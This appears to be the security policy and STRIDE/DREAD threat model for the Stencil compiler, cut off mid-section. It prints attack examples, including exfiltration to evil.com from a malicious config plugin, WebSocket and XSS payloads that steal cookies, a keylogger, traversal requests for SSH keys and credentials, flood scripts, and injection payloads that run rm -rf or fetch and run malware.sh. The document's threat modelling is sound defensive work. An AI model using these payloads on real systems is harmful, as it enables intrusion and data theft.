# Stencil Security Policy

This document outlines the security policy and threat model for the Stencil project.

## Reporting a Vulnerability

The Stencil team and community take all security vulnerabilities seriously. If you believe you have found a security vulnerability in Stencil, please report it to us as described below.

**DO NOT report security vulnerabilities through public GitHub issues.**

Please email us at [product.security@outsystems.com](mailto:product.security@outsystems.com) with a description of the vulnerability and steps to reproduce it. You should receive a response within 48 hours. If for some reason you do not, please follow up via the same email to ensure we received your original message.

## Threat Model

This threat model is intended to provide a security overview of the Stencil project. It is broken down into the following sections:

1.  Feature Breakdown
2.  Threat Identification
3.  Threat Prioritization
4.  Threat Mitigation

### 1. Feature Breakdown

Stencil is a compiler that generates Web Components and builds high-performance web applications. Its architecture can be broken down into the following core components:

*   **Stencil Compiler**: A toolchain that runs in a Node.js environment (typically on a developer machine or a CI/CD server). It transpiles TypeScript/JSX, optimizes components, and bundles them for production. It reads a `stencil.config.ts` file for configuration and has access to the file system.
*   **Dev Server**: A local web server for development. It serves the application, provides hot-module-reloading (HMR), and communicates with the client-side runtime over a WebSocket connection.
*   **Client-side Runtime**: A small piece of JavaScript code that is shipped with every Stencil application. It runs in the end-user's browser and manages component lifecycle, rendering, and event handling.
*   **Server-Side Rendering (Hydrate)**: A system that runs on a Node.js server to pre-render Stencil components into static HTML. This is often used for performance and SEO purposes.
*   **Command Line Interface (CLI)**: The primary tool for developers to interact with Stencil, used for creating projects, building them, running tests, and more.

### 2. Threat Identification

We use the STRIDE model to identify potential security threats for each component, with DREAD scoring for risk assessment.

#### Compiler

**Threat #1: Arbitrary code execution via malicious configuration or plugins**
- **Category**: Elevation of Privilege
- **Description**: Arbitrary code execution through malicious `stencil.config.ts` files, plugins, or compromised dependencies. Since Stencil configuration files are executed as TypeScript/JavaScript during the build process, they have full access to the Node.js environment and can perform any operation the build user can perform. This includes file system access, network requests, spawning processes, and accessing environment variables.

**Attack Scenarios:**
1. **Malicious configuration**: Developer downloads a project template with a compromised `stencil.config.ts`
2. **Supply chain attack**: A legitimate plugin is compromised and pushes malicious code
3. **Dependency confusion**: Attacker publishes a malicious package with a similar name to a legitimate plugin
4. **Social engineering**: Attacker convinces developer to install a "helpful" plugin that contains malicious code

**Example Vulnerable Configuration:**
```typescript
// stencil.config.ts - MALICIOUS
export const config: Config = {
  outputTargets: [{
    type: 'www',
    serviceWorker: null
  }],
  // Malicious code disguised as configuration
  plugins: [
    {
      name: 'innocent-looking-plugin',
      configResolved() {
        // Exfiltrate environment variables
        require('child_process').exec('curl -X POST https://evil.com/steal -d "$(env)"');
        // Install backdoor
        require('fs').writeFileSync('/tmp/backdoor.sh', '#!/bin/bash\n# backdoor code');
      }
    }
  ]
};
```

**Real-world Impact:**
- **2020**: SolarWinds supply chain attack affected 18,000+ organizations
- **2021**: UA-Parser-JS npm package was compromised, affecting millions of downloads
- Build-time code execution can lead to complete compromise of CI/CD pipelines and deployment infrastructure

| Score | Rationale |
|-------|-----------|
| **Damage** | 10 | Complete compromise of developer machine, potential supply chain attack affecting all users of the compiled application |
| **Reproducibility** | 10 | Easy to reproduce by creating malicious config or plugin |
| **Exploitability** | 5 | Requires social engineering to get developer to use malicious config/plugin |
| **Affected Users** | 10 | All users of applications built with compromised toolchain |
| **Discoverability** | 8 | Configuration files are easily inspectable |

**DREAD Score: 43/50 - CRITICAL**

**Threat #2: Information disclosure of environment variables**
- **Category**: Information Disclosure
- **Description**: Leaking environment variables or build-time secrets into the bundle. This occurs when developers inadvertently expose sensitive data such as API keys, database credentials, authentication tokens, or internal service URLs by including them in environment variables that get bundled into the client-side JavaScript. Unlike server-side code, client-side bundles are publicly accessible and can be inspected by anyone, making any embedded secrets immediately visible to attackers.

**Attack Scenarios:**
1. **Direct environment variable exposure**: Developer accidentally references `process.env.DATABASE_PASSWORD` in component code
2. **Configuration file leakage**: Sensitive values from `stencil.config.ts` being included in the bundle
3. **Build script injection**: CI/CD environment variables containing secrets being inadvertently bundled
4. **Third-party plugin exposure**: Malicious or poorly configured plugins accessing and bundling environment variables

**Example Vulnerable Code:**
```typescript
// In a Stencil component - VULNERABLE
@Component({
  tag: 'api-client'
})
export class ApiClient {
  private apiKey = process.env.API_SECRET_KEY; // This gets bundled!
  private dbUrl = process.env.DATABASE_URL;    // This too!
  
  async fetchData() {
    return fetch(`https://api.example.com/data?key=${this.apiKey}`);
  }
}
```

**Example Attack:**
An attacker can simply:
1. Visit the application in a browser
2. Open developer tools and inspect the JavaScript bundle
3. Search for common patterns like "process.env", "API_KEY", "SECRET", etc.
4. Extract the exposed credentials and use them to access backend services

**Real-world Impact:**
- **2019**: GitHub reported that over 100,000 repositories contained exposed API keys
- **2021**: A major e-commerce platform was breached after AWS credentials were found in their client-side bundles
- Exposed database credentials can lead to complete data breaches affecting millions of users

| Score | Rationale |
|-------|-----------|
| **Damage** | 8 | Sensitive data like API keys could be exposed in client-side bundles |
| **Reproducibility** | 10 | Easy to reproduce by misconfiguring environment variable exposure |
| **Exploitability** | 10 | No special tools required, just inspect the bundle |
| **Affected Users** | 10 | All end users of the application can access leaked secrets |
| **Discoverability** | 10 | Bundle contents are publicly accessible |

**DREAD Score: 48/50 - CRITICAL**

**Threat #3: Denial of service via malformed input**
- **Category**: Denial of Service
- **Description**: Malformed input files causing the Stencil compiler to crash, hang, or consume excessive resources during the build process. This can occur through crafted TypeScript/JSX files, CSS files, or assets that exploit parsing vulnerabilities or trigger resource-intensive operations.

**Attack Scenarios:**
1. **Deeply nested JSX**: Extremely nested component structures causing stack overflow
2. **Circular dependencies**: Components with circular imports causing infinite loops
3. **Large file attacks**: Massive files designed to exhaust memory or disk space
4. **Malformed syntax**: Invalid TypeScript/JSX that crashes the parser

**Example Vulnerable Input:**
```typescript
// Deeply nested JSX causing stack overflow
const DeepComponent = () => (
  <div>
    <div>
      <div>
        {/* ... thousands of nested divs ... */}
        <div>Content</div>
        {/* ... thousands of nested divs ... */}
      </div>
    </div>
  </div>
);

// Circular dependency causing infinite loop
// file1.tsx
import { Component2 } from './file2';
export const Component1 = () => <Component2 />;

// file2.tsx  
import { Component1 } from './file1';
export const Component2 = () => <Component1 />;
```

**Impact:**
- Development workflow disruption
- CI/CD pipeline failures
- Resource exhaustion on build servers

| Score | Rationale |
|-------|-----------|
| **Damage** | 5 | Build process fails, development workflow disrupted |
| **Reproducibility** | 8 | Can be reproduced with specific malformed input |
| **Exploitability** | 5 | Requires crafting specific malformed input |
| **Affected Users** | 2.5 | Only affects individual developer |
| **Discoverability** | 8 | Error conditions are often visible in build logs |

**DREAD Score: 28.5/50 - HIGH**

#### Dev Server

**Threat #4: Directory traversal attack**
- **Category**: Information Disclosure
- **Description**: Directory traversal attacks that exploit insufficient path validation in the dev server to access files outside the project root directory. Attackers can use path traversal sequences (../) to navigate up the directory tree and access sensitive files on the developer's machine, including system configuration files, SSH keys, environment files, and other projects.

**Attack Scenarios:**
1. **System file access**: Reading `/etc/passwd`, `/etc/shadow`, or Windows system files
2. **SSH key theft**: Accessing `~/.ssh/id_rsa` or other private keys
3. **Environment file exposure**: Reading `.env` files from other projects
4. **Source code theft**: Accessing source code from other projects on the same machine

**Example Attack:**
```bash
# Attacker crafts malicious URLs to access sensitive files
curl "http://localhost:3333/../../etc/passwd"
curl "http://localhost:3333/../../../home/user/.ssh/id_rsa" 
curl "http://localhost:3333/../../../../var/log/auth.log"

# Or via browser
http://localhost:3333/../../etc/hosts
http://localhost:3333/../../../Users/developer/.aws/credentials
```

**Vulnerable Code Pattern:**
```typescript
// Simplified example of vulnerable path handling
function serveFile(url: string) {
  const filePath = path.join(rootDir, url); // VULNERABLE - no validation
  return fs.readFileSync(filePath);
}
```

**Real-world Impact:**
- **2018**: Numerous Node.js development servers found vulnerable to directory traversal
- Can lead to complete compromise of developer machines and access to multiple projects
- Particularly dangerous in shared development environments

| Score | Rationale |
|-------|-----------|
| **Damage** | 10 | Can read arbitrary files on developer's machine including sensitive data |
| **Reproducibility** | 10 | Easy to reproduce with crafted URLs |
| **Exploitability** | 10 | Simple HTTP requests, no special tools needed |
| **Affected Users** | 2.5 | Individual developer affected |
| **Discoverability** | 10 | Dev server endpoints are easily discoverable |

**DREAD Score: 42.5/50 - CRITICAL**

**Threat #5: Malicious WebSocket connection**
- **Category**: Spoofing
- **Description**: Malicious websites connecting to the Stencil dev server's WebSocket endpoint used for Hot Module Reloading (HMR) to inject malicious code or extract development information. The dev server typically accepts WebSocket connections without proper origin validation, allowing any website the developer visits to potentially connect and manipulate the development environment.

**Attack Scenarios:**
1. **Code injection via HMR**: Malicious site sends fake HMR updates containing malicious JavaScript
2. **Development environment reconnaissance**: Extracting project structure, file paths, and source code
3. **Cross-origin data theft**: Accessing development data through WebSocket messages
4. **Development workflow manipulation**: Interfering with legitimate HMR updates

**Example Attack:**
```html
<!-- Malicious website visited by developer -->
<script>
// Connect to developer's Stencil dev server
const ws = new WebSocket('ws://localhost:3333');

ws.onopen = () => {
  // Inject malicious code via fake HMR update
  ws.send(JSON.stringify({
    type: 'hmr-update',
    path: '/src/components/my-component.tsx',
    content: `
      // Original component code...
      
      // Malicious addition
      fetch('https://evil.com/steal', {
        method: 'POST',
        body: JSON.stringify({
          cookies: document.cookie,
          localStorage: localStorage,
          sessionStorage: sessionStorage
        })
      });
    `
  }));
};

// Extract development information
ws.onmessage = (event) => {
  // Send development data to attacker
  fetch('https://evil.com/dev-data', {
    method: 'POST', 
    body: event.data
  });
};
</script>
```

**Impact:**
- Compromise of development environment
- Theft of proprietary source code
- Injection of malicious code into development builds

| Score | Rationale |
|-------|-----------|
| **Damage** | 8 | Could inject malicious code via HMR, compromise development environment |
| **Reproducibility** | 7.5 | Requires developer to visit malicious site while dev server is running |
| **Exploitability** | 5 | Requires creating malicious website and social engineering |
| **Affected Users** | 2.5 | Individual developer affected |
| **Discoverability** | 9 | WebSocket endpoints are predictable |

**DREAD Score: 32/50 - HIGH**

**Threat #6: Resource exhaustion**
- **Category**: Denial of Service
- **Description**: Resource exhaustion attacks targeting the Stencil dev server through excessive HTTP requests, WebSocket connections, or resource-intensive operations. Since dev servers typically lack production-grade rate limiting and resource management, they can be easily overwhelmed by automated attacks or even accidental excessive requests.

**Attack Scenarios:**
1. **HTTP flood**: Overwhelming the server with rapid HTTP requests
2. **WebSocket exhaustion**: Opening numerous WebSocket connections to exhaust memory
3. **Large file requests**: Requesting large assets repeatedly to exhaust bandwidth/memory
4. **Concurrent build triggers**: Triggering multiple simultaneous rebuilds

**Example Attack:**
```bash
# Simple HTTP flood attack
for i in {1..10000}; do
  curl "http://localhost:3333/" &
done

# WebSocket connection exhaustion
node -e "
for(let i=0; i<1000; i++) {
  new require('ws')('ws://localhost:3333');
}
"

# Large file request loop
while true; do
  curl "http://localhost:3333/large-video-file.mp4" &
done
```

**Automated Attack Script:**
```python
import asyncio
import aiohttp

async def flood_attack():
    connector = aiohttp.TCPConnector(limit=1000)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for i in range(10000):
            task = session.get('http://localhost:3333/')
            tasks.append(task)
        await asyncio.gather(*tasks, return_exceptions=True)

asyncio.run(flood_attack())
```

**Impact:**
- Dev server becomes unresponsive
- Development workflow completely disrupted
- Can affect entire local network if server binds to 0.0.0.0

| Score | Rationale |
|-------|-----------|
| **Damage** | 5 | Dev server becomes unresponsive, development workflow disrupted |
| **Reproducibility** | 10 | Easy to reproduce with automated requests |
| **Exploitability** | 10 | Simple HTTP flood attack |
| **Affected Users** | 2.5 | Individual developer affected |
| **Discoverability** | 10 | Dev server is easily discoverable on local network |

**DREAD Score: 37.5/50 - HIGH**

#### Client-side Runtime

**Threat #7: Cross-Site Scripting (XSS)**
- **Category**: Tampering
- **Description**: Cross-Site Scripting attacks that exploit insufficient input sanitization in Stencil components to inject and execute malicious JavaScript in users' browsers. While Stencil provides some built-in XSS protection through JSX's automatic escaping, developers can still introduce vulnerabilities through unsafe practices like using `innerHTML` with untrusted data or improper handling of user inputs.

**Attack Scenarios:**
1. **Stored XSS**: Malicious scripts stored in database and rendered by components
2. **Reflected XSS**: Malicious scripts in URL parameters reflected in component output
3. **DOM-based XSS**: Client-side JavaScript manipulation of DOM with untrusted data
4. **Component prop injection**: Malicious data passed through component properties

**Example Vulnerable Code:**
```typescript
@Component({
  tag: 'user-profile'
})
export class UserProfile {
  @Prop() userBio: string;
  @Prop() userName: string;
  
  render() {
    return (
      <div>
        {/* VULNERABLE - innerHTML with untrusted data */}
        <div innerHTML={this.userBio}></div>
        
        {/* VULNERABLE - URL parameter directly rendered */}
        <h1>Welcome {new URLSearchParams(location.search).get('name')}</h1>
        
        {/* VULNERABLE - Dynamic script execution */}
        <script>{`var user = "${this.userName}";`}</script>
      </div>
    );
  }
}
```

**Example Attack Payloads:**
```html
<!-- Stored in user bio field -->
<img src="x" onerror="fetch('https://evil.com/steal?cookies='+document.cookie)" />

<!-- In URL parameter -->
https://app.com/profile?name=<script>alert('XSS')</script>

<!-- In component property -->
<user-profile user-name='"; fetch("https://evil.com/steal", {method: "POST", body: localStorage.getItem("authToken")}); //'></user-profile>
```

**Attack Impact:**
- Session hijacking through cookie theft
- Account takeover via stolen authentication tokens
- Defacement of web applications
- Phishing attacks through injected content
- Cryptocurrency mining scripts

| Score | Rationale |
|-------|-----------|
| **Damage** | 10 | Full compromise of user session, data theft, account takeover |
| **Reproducibility** | 8 | Depends on application's input validation |
| **Exploitability** | 9 | Well-known attack vectors, many tools available |
| **Affected Users** | 10 | All end users of the application |
| **Discoverability** | 9 | Input fields and dynamic content are easily identifiable |

**DREAD Score: 46/50 - CRITICAL**

**Threat #8: Information disclosure via component state**
- **Category**: Information Disclosure
- **Description**: Sensitive information being exposed through component props, state, or internal data structures that can be accessed via browser developer tools or client-side inspection. Stencil components run in the browser where all JavaScript is accessible to users, making any sensitive data stored in component memory visible to attackers.

**Attack Scenarios:**
1. **Developer tools inspection**: Using browser dev tools to examine component state
2. **Component debugging**: Accessing component instances through global variables
3. **Memory dump analysis**: Using browser memory profiling to extract sensitive data
4. **Event listener exploitation**: Triggering debug events that expose internal state

**Example Vulnerable Code:**
```typescript
@Component({
  tag: 'payment-form'
})
export class PaymentForm {
  @State() creditCardNumber: string;
  @State() cvv: string;
  @State() apiKey: string = 'sk_live_abc123'; // VULNERABLE - API key in state
  @State() internalUserData = {
    ssn: '123-45-6789',      // VULNERABLE - SSN in state
    salary: 75000,           // VULNERABLE - sensitive PII
    role: 'admin'            // VULNERABLE - privilege info
  };
  
  // VULNERABLE - Debug method exposing sensitive data
  @Method()
  async debugInfo() {
    return {
      creditCard: this.creditCardNumber,
      cvv: this.cvv,
      apiKey: this.apiKey,
      userData: this.internalUserData
    };
  }
  
  render() {
    return (
      <div>
        <input 
          value={this.creditCardNumber}
          onInput={(e) => this.creditCardNumber = e.target.value}
        />
        {/* VULNERABLE - Sensitive data in DOM attributes */}
        <div data-api-key={this.apiKey}>Payment processing...</div>
      </div>
    );
  }
}
```

**Example Attack:**
```javascript
// In browser console - accessing component state
const paymentComponent = document.querySelector('payment-form');

// Direct state access (if exposed)
console.log(paymentComponent.creditCardNumber);
console.log(paymentComponent.apiKey);

// Method invocation
paymentComponent.debugInfo().then(data => {
  console.log('Stolen data:', data);
  // Send to attacker's server
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});

// Component inspection via dev tools
console.log('%c Component State Inspector', 'color: red; font-size: 20px');
Object.getOwnPropertyNames(paymentComponent).forEach(prop => {
  console.log(prop, ':', paymentComponent[prop]);
});
```

**Real-world Impact:**
- Credit card and payment information theft
- Personal Identifiable Information (PII) exposure
- API key and authentication token theft
- Business logic and internal data structure exposure

| Score | Rationale |
|-------|-----------|
| **Damage** | 8 | Sensitive user data or application secrets could be exposed |
| **Reproducibility** | 5 | Depends on specific component implementation |
| **Exploitability** | 9 | Browser dev tools make component inspection easy |
| **Affected Users** | 6 | Users of specific components |
| **Discoverability** | 10 | Component state is visible in browser dev tools |

**DREAD Score: 38/50 - HIGH**

**Threat #9: Client-side denial of service**
- **Category**: Denial of Service
- **Description**: Malicious or poorly written component code that causes excessive CPU usage, memory consumption, or infinite loops, leading to browser freezing or crashes. This can be triggered through crafted user inputs, malicious component properties, or exploitation of inefficient algorithms in component logic.

**Attack Scenarios:**
1. **Infinite render loops**: Components that trigger continuous re-renders
2. **Memory exhaustion**: Creating excessive DOM elements or objects
3. **CPU-intensive operations**: Computationally expensive operations in render methods
4. **Recursive component calls**: Components that call themselves infinitely

**Example Vulnerable Code:**
```typescript
@Component({
  tag: 'vulnerable-list'
})
export class VulnerableList {
  @Prop() items: string[] = [];
  @State() processedItems: any[] = [];
  
  componentWillLoad() {
    // VULNERABLE - Infinite loop with malicious input
    this.processItems();
  }
  
  processItems() {
    // VULNERABLE - No bounds checking
    while (this.items.length > 0) {
      // Process logic that never reduces items.length
      this.processedItems.push(this.items[0]);
      // Missing: this.items.shift();
    }
  }
  
  render() {
    return (
      <div>
        {/* VULNERABLE - Rendering potentially massive arrays */}
        {this.items.map((item, index) => 
          // VULNERABLE - Recursive component rendering
          <vulnerable-list items={[item, item, item]}></vulnerable-list>
        )}
        
        {/* VULNERABLE - Memory exhaustion through massive DOM */}
        {Array(1000000).fill(0).map((_, i) => 
          <div key={i}>Heavy DOM element {i}</div>
        )}
      </div>
    );
  }
  
  @Listen('click')
  handleClick() {
    // VULNERABLE - CPU-intensive operation on every click
    for (let i = 0; i < 10000000; i++) {
      Math.sqrt(Math.random() * 1000000);
    }
  }
}
```

**Example Attack:**
```html
<!-- Trigger DoS via component properties -->
<vulnerable-list items='["a","b","c","d","e","f","g","h","i","j"]'></vulnerable-list>

<script>
// Programmatic DoS attack
const list = document.querySelector('vulnerable-list');

// Trigger infinite loop
list.items = ['malicious', 'payload'];

// Memory exhaustion attack
list.items = new Array(1000000).fill('heavy-data');

// CPU exhaustion through events
setInterval(() => {
  list.click();
}, 1);
</script>
```

**Attack Vectors:**
- Malicious URL parameters that trigger vulnerable component logic
- Form inputs designed to cause infinite processing
- WebSocket messages containing DoS payloads
- Social engineering to get users to visit malicious pages

**Impact:**
- Browser becomes unresponsive or crashes
- Complete denial of service for legitimate users
- Mobile devices may experience battery drain or overheating
- Can affect entire browser session, not just the single tab

| Score | Rationale |
|-------|-----------|
| **Damage** | 5 | Browser becomes unresponsive, poor user experience |
| **Reproducibility** | 8 | Reproducible with specific component interactions |
| **Exploitability** | 5 | Requires understanding of component behavior |
| **Affected Users** | 10 | All users of the application |
| **Discoverability** | 8 | Performance issues are noticeable during testing |

**DREAD Score: 36/50 - HIGH**

#### Server-Side Rendering

**Threat #10: XSS in SSR output**
- **Category**: Tampering
- **Description**: Cross-Site Scripting vulnerabilities in Server-Side Rendered (SSR) HTML output where malicious scripts are injected during the pre-rendering process and served to all users. This is particularly dangerous because the malicious content is generated on the trusted server and served as static HTML, making it appear legitimate and bypassing some client-side XSS protections.

**Attack Scenarios:**
1. **Database poisoning**: Malicious scripts stored in backend database and rendered during SSR
2. **API data injection**: External APIs returning malicious payloads that get SSR rendered
3. **Template injection**: Exploiting server-side template processing to inject scripts
4. **Build-time injection**: Malicious content introduced during the SSR build process

**Example Vulnerable SSR Code:**
```typescript
// Server-side rendering component
@Component({
  tag: 'blog-post'
})
export class BlogPost {
  @Prop() title: string;
  @Prop() content: string;
  @Prop() authorBio: string;
  
  render() {
    return (
      <article>
        {/* VULNERABLE - Title from database not sanitized */}
        <h1 innerHTML={this.title}></h1>
        
        {/* VULNERABLE - User-generated content in SSR */}
        <div innerHTML={this.content}></div>
        
        {/* VULNERABLE - Author bio with HTML injection */}
        <footer innerHTML={this.authorBio}></footer>
        
        {/* VULNERABLE - Direct template injection */}
        <script>{`window.postData = ${JSON.stringify({
          title: this.title,      // Can break out of JSON context
          author: this.authorBio  // Unescaped content
        })};`}</script>
      </article>
    );
  }
}

// SSR rendering process
export async function renderBlogPost(postId: string) {
  // VULNERABLE - No sanitization of database content
  const post = await database.getPost(postId);
  
  return renderToString(
    <blog-post 
      title={post.title}           // Malicious content from DB
      content={post.content}       // User-generated content
      author-bio={post.authorBio}  // Untrusted author data
    />
  );
}
```

**Example Attack Payloads:**
```html
<!-- Stored in database title field -->
<script>
  // Steal authentication cookies
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: 'cookies=' + document.cookie
  });
</script>

<!-- In blog post content -->
<img src="x" onerror="
  // Keylogger injection
  document.addEventListener('keypress', (e) => {
    fetch('https://evil.com/keylog', {
      method: 'POST',
      body: e.key
    });
  });
" />

<!-- JSON context breakout in authorBio -->
"; fetch('https://evil.com/steal?data=' + btoa(JSON.stringify(window.localStorage))); //
```

**SSR-Specific Attack Characteristics:**
- **Persistent**: Affects all users visiting the pre-rendered page
- **Trusted context**: Appears as legitimate server-generated content
- **Cache amplification**: Malicious content gets cached by CDNs and browsers
- **SEO poisoning**: Search engines may index malicious content

**Real-world Impact:**
- **2019**: Major e-commerce platform had XSS in SSR product pages affecting thousands of customers
- **2020**: News website's SSR commenting system was exploited to inject cryptocurrency miners
- Can lead to mass account compromise and large-scale data theft

| Score | Rationale |
|-------|-----------|
| **Damage** | 10 | XSS in SSR affects all users receiving the pre-rendered content |
| **Reproducibility** | 8 | Depends on server-side input validation |
| **Exploitability** | 9 | Similar to client-side XSS but potentially more impactful |
| **Affected Users** | 10 | All users receiving SSR content |
| **Discoverability** | 9 | SSR output can be inspected in page source |

**DREAD Score: 46/50 - CRITICAL**

**Threat #11: Server-side information disclosure**
- **Category**: Information Disclosure
- **Description**: Sensitive server-side information being exposed in the SSR output, including database connection strings, API keys, internal error messages, file paths, environment variables, and other confidential data that should remain server-side only. This occurs when server-side rendering processes fail to properly sanitize or filter data before including it in the HTML response.

**Attack Scenarios:**
1. **Error message leakage**: Detailed error messages containing system information
2. **Environment variable exposure**: Server environment data included in rendered output
3. **Database information disclosure**: Connection strings or query details in output
4. **Internal API exposure**: Internal service URLs and endpoints revealed
5. **Source code leakage**: Server-side code or comments included in HTML

**Example Vulnerable SSR Code:**
```typescript
// Server-side component with information disclosure
@Component({
  tag: 'dashboard'
})
export class Dashboard {
  @Prop() userData: any;
  @State() debugInfo: any;
  
  async componentWillLoad() {
    try {
      // VULNERABLE - Including sensitive server data
      this.debugInfo = {
        dbConnection: process.env.DATABASE_URL,     // LEAKED
        apiKeys: process.env.STRIPE_SECRET_KEY,     // LEAKED
        internalServices: process.env.INTERNAL_API_URLS, // LEAKED
        serverPath: __dirname,                      // LEAKED
        nodeVersion: process.version                // LEAKED
      };
      
      this.userData = await this.fetchUserData();
    } catch (error) {
      // VULNERABLE - Detailed error in production
      this.debugInfo.error = {
        stack: error.stack,                    // LEAKED - shows file paths
        query: error.query,                    // LEAKED - database queries
        connectionString: error.connectionString // LEAKED
      };
    }
  }
  
  private async fetchUserData() {
    // Simulate database error
    throw new Error(`Database connection failed: ${process.env.DB_HOST}:${process.env.DB_PORT}`);
  }
  
  render() {
    return (
      <div>
        <h1>User Dashboard</h1>
        
        {/* VULNERABLE - Debug info in production */}
        {process.env.NODE_ENV !== 'production' && (
          <pre>{JSON.stringify(this.debugInfo, null, 2)}</pre>
        )}
        
        {/* VULNERABLE - Server data in HTML comments */}
        <!-- Server Info: {JSON.stringify(this.debugInfo)} -->
        
        {/* VULNERABLE - Error details exposed */}
        {this.debugInfo?.error && (
          <div class="error">
            <h2>Error Details:</h2>
            <pre>{this.debugInfo.error.stack}</pre>
            <p>Query: {this.debugInfo.error.query}</p>
          </div>
        )}
      </div>
    );
  }
}
```

**Example of Leaked Information in HTML:**
```html
<!-- Generated SSR output containing sensitive data -->
<div>
  <h1>User Dashboard</h1>
  
  <!-- Server Info: {
    "dbConnection": "postgresql://admin:secret123@internal-db.company.com:5432/production",
    "apiKeys": "sk_live_abc123def456ghi789",
    "internalServices": "https://internal-api.company.com/v1",
    "serverPath": "/opt/app/dist/server",
    "error": {
      "stack": "Error: Database connection failed: internal-db.company.com:5432\n    at /opt/app/server/components/dashboard.js:45:12",
      "query": "SELECT * FROM users WHERE api_key = 'sk_live_abc123def456ghi789'",
      "connectionString": "postgresql://admin:secret123@internal-db.company.com:5432/production"
    }
  } -->
  
  <div class="error">
    <h2>Error Details:</h2>
    <pre>Error: Database connection failed: internal-db.company.com:5432
    at /opt/app/server/components/dashboard.js:45:12
    at processTicksAndRejections (internal/process/task_queues.js:93:5)</pre>
    <p>Query: SELECT * FROM users WHERE api_key = 'sk_live_abc123def456ghi789'</p>
  </div>
</div>
```

**Attack Exploitation:**
```bash
# Attacker views page source to extract sensitive data
curl -s https://app.com/dashboard | grep -E "(password|key|secret|database|internal)"

# Automated scanning for information disclosure
grep -r "process.env\|__dirname\|DATABASE_URL" view-source:https://app.com/
```

**Real-world Impact:**
- **2018**: Major SaaS provider exposed database credentials in SSR error pages
- **2020**: E-commerce site leaked internal API endpoints enabling further attacks
- Exposed API keys can lead to financial fraud and service abuse
- Database credentials enable complete data breaches

| Score | Rationale |
|-------|-----------|
| **Damage** | 9 | Server-side secrets, database connection strings, or internal errors exposed |
| **Reproducibility** | 5 | Depends on error handling implementation |
| **Exploitability** | 8 | Can trigger errors through various inputs |
| **Affected Users** | 10 | All users can see the leaked information |
| **Discoverability** | 8 | Error messages and debug info often visible in HTML source |

**DREAD Score: 40/50 - CRITICAL**

**Threat #12: Server-side denial of service**
- **Category**: Denial of Service
- **Description**: Malicious input or requests causing resource exhaustion during server-side rendering, leading to server downtime and service unavailability. This can occur through computationally expensive rendering operations, memory exhaustion, infinite loops, or overwhelming the server with resource-intensive SSR requests.

**Attack Scenarios:**
1. **Computational exhaustion**: Requests that trigger CPU-intensive rendering operations
2. **Memory exhaustion**: Rendering operations that consume excessive memory
3. **Infinite loops**: Malicious data causing endless processing cycles
4. **Concurrent request flooding**: Multiple simultaneous resource-intensive SSR requests

**Example Vulnerable SSR Code:**
```typescript
@Component({
  tag: 'data-visualizer'
})
export class DataVisualizer {
  @Prop() dataset: any[];
  @Prop() iterations: number;
  
  async componentWillLoad() {
    // VULNERABLE - No input validation
    await this.processLargeDataset();
  }
  
  private async processLargeDataset() {
    // VULNERABLE - No bounds checking
    for (let i = 0; i < this.iterations; i++) {
      // VULNERABLE - Potentially infinite loop
      this.dataset.forEach(item => {
        // CPU-intensive operation
        this.heavyComputation(item);
      });
    }
  }
  
  private heavyComputation(data: any) {
    // VULNERABLE - No timeout or limits
    const results = [];
    for (let i = 0; i < data.size; i++) {
      results.push(this.expensiveOperation(data));
    }
    return results;
  }
  
  render() {
    return (
      <div>
        {/* VULNERABLE - Rendering massive arrays */}
        {this.dataset.map((item, index) => (
          <div key={index}>
            {/* VULNERABLE - Nested expensive rendering */}
            {Array(item.multiplier).fill(0).map((_, i) => (
              <complex-chart data={item} index={i} />
            ))}
          </div>
        ))}
      </div>
    );
  }
}
```

**Example Attack Requests:**
```http
POST /api/render HTTP/1.1
Content-Type: application/json

{
  "component": "data-visualizer",
  "props": {
    "dataset": [
      {"size": 1000000, "multiplier": 1000},
      {"size": 1000000, "multiplier": 1000},
      {"size": 1000000, "multiplier": 1000}
    ],
    "iterations": 999999999
  }
}
```

**Automated DoS Attack:**
```bash
# Flood server with resource-intensive requests
for i in {1..100}; do
  curl -X POST https://app.com/api/render \
    -H "Content-Type: application/json" \
    -d '{
      "component": "data-visualizer",
      "props": {
        "dataset": [{"size": 10000000, "multiplier": 1000}],
        "iterations": 100000
      }
    }' &
done
```

**Impact:**
- Server becomes unresponsive or crashes
- Service unavailability for all users
- Potential infrastructure costs from resource consumption
- Can affect entire application, not just SSR functionality

| Score | Rationale |
|-------|-----------|
| **Damage** | 8 | Server becomes unresponsive, affects all users |
| **Reproducibility** | 7.5 | Requires crafting specific resource-intensive inputs |
| **Exploitability** | 5 | Requires understanding of SSR resource consumption |
| **Affected Users** | 10 | All users of the SSR application |
| **Discoverability** | 8 | Resource usage patterns can be observed |

**DREAD Score: 38.5/50 - HIGH**

#### CLI

**Threat #13: Argument injection**
- **Category**: Tampering
- **Description**: Malicious injection of command-line arguments into the Stencil CLI to execute unintended operations, access unauthorized files, or manipulate the build process. This can occur when user input is improperly sanitized before being passed to CLI commands, or when build scripts dynamically construct CLI arguments from untrusted sources.

**Attack Scenarios:**
1. **Build script injection**: Malicious arguments injected through build configurations
2. **CI/CD pipeline exploitation**: Compromised environment variables affecting CLI arguments
3. **Plugin argument manipulation**: Third-party plugins passing malicious arguments
4. **Dynamic argument construction**: Unsafe construction of CLI commands from user input

**Example Vulnerable Code:**
```javascript
// Vulnerable build script
const stencilConfig = JSON.parse(process.env.STENCIL_CONFIG || '{}');

// VULNERABLE - No argument sanitization
const command = `stencil build --config ${stencilConfig.configPath} --output ${stencilConfig.outputDir}`;

// VULNERABLE - Direct argument injection
exec(command, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error}`);
    return;
  }
  console.log(stdout);
});

// VULNERABLE - User-controlled file paths
function buildWithCustomConfig(userProvidedConfig) {
  const args = [
    'build',
    '--config',
    userProvidedConfig,  // VULNERABLE - No validation
    '--serve',
    '--watch'
  ];
  
  spawn('stencil', args);
}
```

**Example Attack Payloads:**
```bash
# Environment variable injection
STENCIL_CONFIG='{"configPath": "config.ts; cat /etc/passwd #", "outputDir": "dist"}'

# Argument injection via config path
userProvidedConfig = "config.ts --serve --watch --host 0.0.0.0 --port 8080; rm -rf /important-files; #"

# Command injection through build arguments
stencil build --config "config.ts; curl -X POST https://evil.com/steal -d @.env; #"

# File path manipulation
stencil build --config ../../sensitive-config.ts --output /tmp/stolen-build

# Plugin argument injection
stencil build --config config.ts --plugin "evil-plugin; wget https://evil.com/malware.sh && chmod +x malware.sh && ./malware.sh"
```

**Real Attack Example:**
```javascript
// Malicious CI/CD configuration
{
